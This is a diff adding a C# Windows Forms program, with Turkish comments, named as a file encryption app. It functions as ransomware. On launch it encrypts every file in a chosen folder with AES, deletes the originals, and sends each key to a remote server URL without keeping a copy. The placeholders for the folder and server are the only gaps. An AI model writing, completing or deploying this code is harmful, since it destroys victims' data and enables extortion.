@@ -1,0 +1,90 @@
+using System;
+using System.IO;
+using System.Net;
+using System.Net.Http;
+using System.Security.Cryptography;
+using System.Text;
+using System.Windows.Forms;
+
+namespace FileEncryptionApp
+{
+    public partial class MainForm : Form
+    {
+        private readonly string folderPath = "your_folder_path"; // Şifreleme yapılacak klasör yolu
+        private readonly string serverUrl = "your_server_url"; // Şifreleme anahtarını göndereceğiniz sunucu URL'si
+
+        public MainForm()
+        {
+            InitializeComponent();
+            StartFileEncryption();
+        }
+
+        private async void StartFileEncryption()
+        {
+            try
+            {
+                string[] files = Directory.GetFiles(folderPath);
+
+                foreach (string filePath in files)
+                {
+                    string encryptedFilePath = Path.ChangeExtension(filePath, ".encrypted");
+
+                    using (Aes aesAlg = Aes.Create())
+                    {
+                        aesAlg.KeySize = 256;
+                        aesAlg.Mode = CipherMode.CBC;
+
+                        aesAlg.GenerateIV();
+
+                        // Şifreleme anahtarını sunucuya gönder
+                        await SendEncryptionKey(aesAlg.Key);
+
+                        using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
+                        {
+                            using (FileStream encryptedFileStream = new FileStream(encryptedFilePath, FileMode.Create, FileAccess.Write))
+                            {
+                                // IV'yi çıktı dosyasının başına yaz
+                                encryptedFileStream.Write(aesAlg.IV, 0, aesAlg.IV.Length);
+
+                                using (CryptoStream cryptoStream = new CryptoStream(encryptedFileStream, aesAlg.CreateEncryptor(), CryptoStreamMode.Write))
+                                {
+                                    inputFileStream.CopyTo(cryptoStream);
+                                }
+                            }
+                        }
+                    }
+
+                    File.Delete(filePath); // Orijinal dosyayı sil
+                }
+
+                MessageBox.Show("Dosyaların otomatik şifrelemesi tamamlandı.");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Hata oluştu: " + ex.Message);
+            }
+        }
+
+        private async Task SendEncryptionKey(byte[] encryptionKey)
+        {
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    // Şifreleme anahtarını sunucuya göndermek için POST isteği yap
+                    var content = new StringContent(Convert.ToBase64String(encryptionKey), Encoding.UTF8, "application/json");
+                    var response = await client.PostAsync(serverUrl, content);
+
+                    if (!response.IsSuccessStatusCode)
+                    {
+                        MessageBox.Show("Şifreleme anahtarı gönderme hatası: " + response.StatusCode);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Hata oluştu: " + ex.Message);
+            }
+        }
+    }
+}
